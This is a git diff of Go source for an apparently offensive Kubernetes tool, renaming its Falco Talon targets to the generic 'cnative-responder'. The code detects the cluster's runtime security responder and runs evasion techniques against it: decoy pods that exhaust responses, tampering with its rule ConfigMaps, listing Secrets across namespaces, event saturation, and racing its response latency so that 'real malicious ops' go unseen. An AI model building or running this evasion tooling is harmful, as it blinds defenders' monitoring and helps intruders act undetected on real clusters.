@@ -11,7 +11,7 @@ import (
 	"k8s.io/client-go/kubernetes"
 )
 
-func detectFalcoTalon(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
+func detectCnativeResponder(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
 	namespaces := []string{"falco", "falco-talon", "kube-system"}
 	for _, ns := range namespaces {
 		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
@@ -19,10 +19,10 @@ func detectFalcoTalon(ctx context.Context, client kubernetes.Interface) []Detect
 		})
 		if err == nil && len(pods.Items) > 0 {
 			return []DetectionSystem{{
-				Name:      "falco-talon",
+				Name:      "cnative-responder",
 				Detected:  true,
 				Namespace: ns,
-				Details:   fmt.Sprintf("%d falco-talon pods", len(pods.Items)),
+				Details:   fmt.Sprintf("%d cnative-responder pods", len(pods.Items)),
 			}}
 		}
 
@@ -31,7 +31,7 @@ func detectFalcoTalon(ctx context.Context, client kubernetes.Interface) []Detect
 			for _, d := range deps.Items {
 				if strings.Contains(d.Name, "falco-talon") || strings.Contains(d.Name, "falcosidekick") {
 					return []DetectionSystem{{
-						Name:      "falco-talon",
+						Name:      "cnative-responder",
 						Detected:  true,
 						Namespace: ns,
 						Details:   fmt.Sprintf("deployment: %s", d.Name),
@@ -44,35 +44,35 @@ func detectFalcoTalon(ctx context.Context, client kubernetes.Interface) []Detect
 	return nil
 }
 
-// EvadeFalcoTalon executes the specified Falco Talon evasion technique.
-func EvadeFalcoTalon(ctx context.Context, client kubernetes.Interface, _ dynamic.Interface, technique string) (*EvasionResult, error) {
+// EvadeCnativeResponder executes the specified cnative-responder evasion technique.
+func EvadeCnativeResponder(ctx context.Context, client kubernetes.Interface, _ dynamic.Interface, technique string) (*EvasionResult, error) {
 	switch technique {
 	case "decoy":
-		return talonDecoy(ctx, client)
+		return cnativeResponderDecoy(ctx, client)
 	case "rule_modify":
-		return talonRuleModify(ctx, client)
+		return cnativeResponderRuleModify(ctx, client)
 	case "saturate":
-		return talonSaturate(ctx, client)
+		return cnativeResponderSaturate(ctx, client)
 	case "response_race":
-		return talonResponseRace(ctx, client)
+		return cnativeResponderResponseRace(ctx, client)
 	default:
-		return talonDecoy(ctx, client)
+		return cnativeResponderDecoy(ctx, client)
 	}
 }
 
-func talonDecoy(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
+func cnativeResponderDecoy(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Falco Talon Decoy Distraction:\n\n")
+	sb.WriteString("cnative-responder Decoy Distraction:\n\n")
 
-	sb.WriteString("  Falco Talon automates responses to Falco alerts.\n")
+	sb.WriteString("  cnative-responder automates responses to cnative-sensor alerts.\n")
 	sb.WriteString("  Typical response actions: kill pod, label pod, network isolate.\n")
 	sb.WriteString("  Strategy: trigger decoy alerts to exhaust response capacity.\n\n")
 
 	sb.WriteString("  Decoy attack patterns:\n")
-	sb.WriteString("    1. Spawn sacrificial pods that trigger known Falco rules\n")
-	sb.WriteString("    2. Talon kills the decoy pods (expected behavior)\n")
+	sb.WriteString("    1. Spawn sacrificial pods that trigger known cnative-sensor rules\n")
+	sb.WriteString("    2. cnative-responder kills the decoy pods (expected behavior)\n")
 	sb.WriteString("    3. While response engine is busy, execute real operation\n")
-	sb.WriteString("    4. Talon has rate limits — flood with decoys to hit ceiling\n\n")
+	sb.WriteString("    4. cnative-responder has rate limits — flood with decoys to hit ceiling\n\n")
 
 	sb.WriteString("  Rules that trigger automated response:\n")
 	sb.WriteString("    - Terminal shell in container → kill pod\n")
@@ -85,13 +85,13 @@ func talonDecoy(ctx context.Context, client kubernetes.Interface) (*EvasionResul
 		Limit:         10,
 	})
 	if err == nil && len(pods.Items) > 0 {
-		sb.WriteString("  Previously killed pods (Talon response labels):\n")
+		sb.WriteString("  Previously killed pods (cnative-responder response labels):\n")
 		for _, p := range pods.Items {
 			fmt.Fprintf(&sb, "    %s/%s\n", p.Namespace, p.Name)
 		}
 	}
 
-	sb.WriteString("  Timing window: Talon response cycle is typically 2-5 seconds\n")
+	sb.WriteString("  Timing window: cnative-responder response cycle is typically 2-5 seconds\n")
 	sb.WriteString("  After triggering decoy, execute real ops within that window\n")
 
 	return &EvasionResult{
@@ -101,9 +101,9 @@ func talonDecoy(ctx context.Context, client kubernetes.Interface) (*EvasionResul
 	}, nil
 }
 
-func talonRuleModify(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
+func cnativeResponderRuleModify(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Falco Talon Rule Modification:\n\n")
+	sb.WriteString("cnative-responder Rule Modification:\n\n")
 
 	namespaces := []string{"falco", "falco-talon", "kube-system"}
 	modified := false
@@ -133,8 +133,8 @@ func talonRuleModify(ctx context.Context, client kubernetes.Interface) (*Evasion
 	}
 
 	if !modified {
-		sb.WriteString("  No Talon ConfigMaps found\n")
-		sb.WriteString("  Talon may use file-based config mounted from Secret\n\n")
+		sb.WriteString("  No cnative-responder ConfigMaps found\n")
+		sb.WriteString("  cnative-responder may use file-based config mounted from Secret\n\n")
 
 		for _, ns := range namespaces {
 			secrets, err := client.CoreV1().Secrets(ns).List(ctx, metav1.ListOptions{})
@@ -166,13 +166,13 @@ func talonRuleModify(ctx context.Context, client kubernetes.Interface) (*Evasion
 	}, nil
 }
 
-func talonSaturate(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
+func cnativeResponderSaturate(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Falco Talon Saturation Attack:\n\n")
+	sb.WriteString("cnative-responder Saturation Attack:\n\n")
 
-	sb.WriteString("  Falco Talon processes alerts from Falco's output queue.\n")
-	sb.WriteString("  Overwhelming Falco with events saturates Talon's input.\n")
-	sb.WriteString("  When saturated, Talon drops events or delays responses.\n\n")
+	sb.WriteString("  cnative-responder processes alerts from cnative-sensor's output queue.\n")
+	sb.WriteString("  Overwhelming cnative-sensor with events saturates cnative-responder's input.\n")
+	sb.WriteString("  When saturated, cnative-responder drops events or delays responses.\n\n")
 
 	sb.WriteString("  Saturation vectors:\n")
 	sb.WriteString("    1. Mass file operations (trigger file access rules)\n")
@@ -193,8 +193,8 @@ func talonSaturate(ctx context.Context, client kubernetes.Interface) (*EvasionRe
 	}
 
 	sb.WriteString("\n  Expected impact:\n")
-	sb.WriteString("    - Falco event queue fills (grpc output buffer limit)\n")
-	sb.WriteString("    - Talon goroutine pool exhausted\n")
+	sb.WriteString("    - cnative-sensor event queue fills (grpc output buffer limit)\n")
+	sb.WriteString("    - cnative-responder goroutine pool exhausted\n")
 	sb.WriteString("    - Response latency increases from ~2s to 30s+\n")
 	sb.WriteString("    - Some events dropped entirely under sustained load\n")
 	sb.WriteString("    - Real malicious ops executed during saturation window\n")
@@ -206,12 +206,12 @@ func talonSaturate(ctx context.Context, client kubernetes.Interface) (*EvasionRe
 	}, nil
 }
 
-func talonResponseRace(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
+func cnativeResponderResponseRace(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Falco Talon Response Race:\n\n")
+	sb.WriteString("cnative-responder Response Race:\n\n")
 
-	sb.WriteString("  Falco Talon's response pipeline has inherent latency:\n")
-	sb.WriteString("    Event occurs → Falco detects → gRPC to Talon → action executes\n")
+	sb.WriteString("  cnative-responder's response pipeline has inherent latency:\n")
+	sb.WriteString("    Event occurs → cnative-sensor detects → gRPC to cnative-responder → action executes\n")
 	sb.WriteString("  Total latency: 1-5 seconds (best case)\n\n")
 
 	sb.WriteString("  Race condition exploitation:\n")
@@ -232,14 +232,14 @@ func talonResponseRace(ctx context.Context, client kubernetes.Interface) (*Evasi
 	apiLatency := time.Since(now)
 	if err == nil {
 		fmt.Fprintf(&sb, "  API server latency: %s\n", apiLatency)
-		fmt.Fprintf(&sb, "  Estimated Talon response: %s (API × pipeline stages)\n", apiLatency*5)
-		sb.WriteString("  Any op completing faster than Talon response is invisible\n")
+		fmt.Fprintf(&sb, "  Estimated cnative-responder response: %s (API × pipeline stages)\n", apiLatency*5)
+		sb.WriteString("  Any op completing faster than cnative-responder response is invisible\n")
 	}
 
 	sb.WriteString("\n  Advanced: ephemeral container race\n")
 	sb.WriteString("    - Launch ephemeral container, execute, exit before kill\n")
-	sb.WriteString("    - Container is gone by the time Talon processes the alert\n")
-	sb.WriteString("    - Talon's 'kill pod' action targets a pod already clean\n")
+	sb.WriteString("    - Container is gone by the time cnative-responder processes the alert\n")
+	sb.WriteString("    - cnative-responder's 'kill pod' action targets a pod already clean\n")
 
 	return &EvasionResult{
 		Technique: "response_race",
